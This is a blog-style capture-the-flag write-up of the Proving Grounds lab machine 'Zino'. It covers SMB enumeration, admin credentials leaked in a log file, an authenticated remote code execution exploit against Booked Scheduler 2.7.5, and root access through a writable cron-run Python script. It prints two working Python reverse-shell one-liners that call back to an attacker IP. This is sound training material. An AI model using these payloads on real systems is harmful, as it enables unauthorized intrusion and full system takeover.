---
title: "Proving grounds Practice: Zino"
layout: post
date: 2024-03-07 02:00
tag: 
- CTF
- Offsec labs
- OSCP
- Writeup
- Linux
- PG-Practice
- smb
- Booked Scheduler
- Cronjobs
writeups: true
hidden: true
author: Naveen
description: "Offsec proving grounds practice linux machine writeup"
---

# NMAP

```text
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3306/tcp open  mysql?
8003/tcp open  http        Apache httpd 2.4.38
```

## 139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
## 445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)

Found smb share.

```sh
	Sharename       Type      Comment
	---------       ----      -------
	zino            Disk      Logs
	print$          Disk      Printer Drivers
	IPC$            IPC       IPC Service (Samba 4.9.5-Debian)
Reconnecting with SMB1 for workgroup listing.
```

```sh
naveenj@hackerspace:[10:16]~/proving_grounds/Zino$ smbclient //192.168.201.64/zino -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Jul  9 15:11:49 2020
  ..                                  D        0  Tue Apr 28 09:38:53 2020
  .bash_history                       H        0  Tue Apr 28 11:35:28 2020
  error.log                           N      265  Tue Apr 28 10:07:32 2020
  .bash_logout                        H      220  Tue Apr 28 09:38:53 2020
  local.txt                           N       33  Wed Oct 25 10:11:40 2023
  .bashrc                             H     3526  Tue Apr 28 09:38:53 2020
  .gnupg                             DH        0  Tue Apr 28 10:17:02 2020
  .profile                            H      807  Tue Apr 28 09:38:53 2020
  misc.log                            N      424  Tue Apr 28 10:08:15 2020
  auth.log                            N      368  Tue Apr 28 10:07:54 2020
  access.log                          N     5464  Tue Apr 28 10:07:09 2020
  ftp
```

Downloaded local.txt file.

auth.log

```sh
Apr 28 08:16:54 zino groupadd[1044]: new group: name=peter, GID=1001
Apr 28 08:16:54 zino useradd[1048]: new user: name=peter, UID=1001, GID=1001, home=/home/peter, shell=/bin/bash
Apr 28 08:17:01 zino passwd[1056]: pam_unix(passwd:chauthtok): password changed for peter
Apr 28 08:17:01 zino CRON[1058]: pam_unix(cron:session): session opened for user root by (uid=0)
```

misc.log

```sh
naveenj@hackerspace:[10:32]~/proving_grounds/Zino$ cat misc.log 
Apr 28 08:39:01 zino systemd[1]: Starting Clean php session files...
Apr 28 08:39:01 zino CRON[2791]: (CRON) info (No MTA installed, discarding output)
Apr 28 08:39:01 zino systemd[1]: phpsessionclean.service: Succeeded.
Apr 28 08:39:01 zino systemd[1]: Started Clean php session files.
Apr 28 08:39:01 zino systemd[1]: Set application username "admin"
Apr 28 08:39:01 zino systemd[1]: Set application password "adminadmin"
```

## 8003/tcp open  http        Apache httpd 2.4.38

Booked Scheduler v2.7.5 - search for exploit using searchsploit.

Booked Scheduler 2.7.5 - Remote Command Execution (RCE) (Authenticated)   | php/webapps/50594.py

**Credentials**

`admin:adminadmin`

As per the exploit...

- Direct to the below URL and upload reverse shell or remote code execution php file.

`http://192.168.201.64:8003/booked/Web/admin/manage_theme.php`

- Trigger shell at `http://192.168.201.64:8003/booked/Web/custom-favicon.php?cmd=id`.

Python2 reverese shell

```sh
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.232",22));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

- Url encode and send the request.

```sh
naveenj@hackerspace:[10:45]~/proving_grounds/Zino$ nc -lvnp 22
listening on [any] 22 ...
connect to [192.168.45.232] from (UNKNOWN) [192.168.201.64] 51696
$ id
id
```

Initial Foothold Obtained.

## Privilege Escalation


Download and run linpeas using port 8003

```sh
*/3 *   * * *   root    python /var/www/html/booked/cleanup.py
```
Cronjon running every 3 minutes.

**Python2 reverse shell**

```sh
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.232",21));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
```

Add the reverse shell code to cleanup.py file and wait for 3 minutes to get reverse connection.

```sh
naveenj@hackerspace:[11:13]~/proving_grounds/Zino$ nc -lvnp 21
listening on [any] 21 ...
connect to [192.168.45.232] from (UNKNOWN) [192.168.201.64] 35774
# 
```

**Root Obtained**

For more insights and updates, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr).